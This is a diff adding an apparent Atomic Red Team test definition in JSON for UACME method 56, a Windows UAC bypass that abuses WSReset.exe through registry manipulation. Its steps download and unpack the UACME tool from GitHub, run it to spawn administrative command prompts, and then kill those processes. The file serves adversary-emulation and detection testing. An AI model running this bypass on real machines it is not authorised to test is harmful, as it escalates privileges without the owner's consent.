@@ -1,0 +1,105 @@
+{
+  "id": "235ec031-cd2d-465d-a7ae-68bab281e80e",
+  "name": "UACME Bypass Method 56",
+  "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e6c89fc9-c9a0-403d-97ee-47f92b936c5a",
+      "type": "execute-command",
+      "data": {
+        "command": "\"#{uacme_exe}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "26da7a41-4ab6-4da7-9e69-f4a2ccf71823",
+      "type": "execute-command",
+      "data": {
+        "command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3774916d-d365-4472-a850-7513e939aa29",
+      "name": "Check dependency 1/1",
+      "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "adffb922-8001-49ce-ae97-dad8d7fdca03",
+      "name": "Resolve dependency 1/1",
+      "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5afd3d79-d9cc-4680-affb-8926adfe2e1b",
+      "name": "Re-check dependency 1/1",
+      "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "e6c89fc9-c9a0-403d-97ee-47f92b936c5a",
+      "p": "on-success",
+      "o": "26da7a41-4ab6-4da7-9e69-f4a2ccf71823"
+    },
+    {
+      "s": "e6c89fc9-c9a0-403d-97ee-47f92b936c5a",
+      "p": "on-failure",
+      "o": "26da7a41-4ab6-4da7-9e69-f4a2ccf71823"
+    },
+    {
+      "s": "3774916d-d365-4472-a850-7513e939aa29",
+      "p": "on-success",
+      "o": "e6c89fc9-c9a0-403d-97ee-47f92b936c5a"
+    },
+    {
+      "s": "3774916d-d365-4472-a850-7513e939aa29",
+      "p": "on-failure",
+      "o": "adffb922-8001-49ce-ae97-dad8d7fdca03"
+    },
+    {
+      "s": "adffb922-8001-49ce-ae97-dad8d7fdca03",
+      "p": "on-success",
+      "o": "5afd3d79-d9cc-4680-affb-8926adfe2e1b"
+    },
+    {
+      "s": "5afd3d79-d9cc-4680-affb-8926adfe2e1b",
+      "p": "on-failure",
+      "o": "e6c89fc9-c9a0-403d-97ee-47f92b936c5a"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "uacme_exe",
+      "type": "path",
+      "description": "Path to uacme executable",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe"
+    }
+  ]
+}
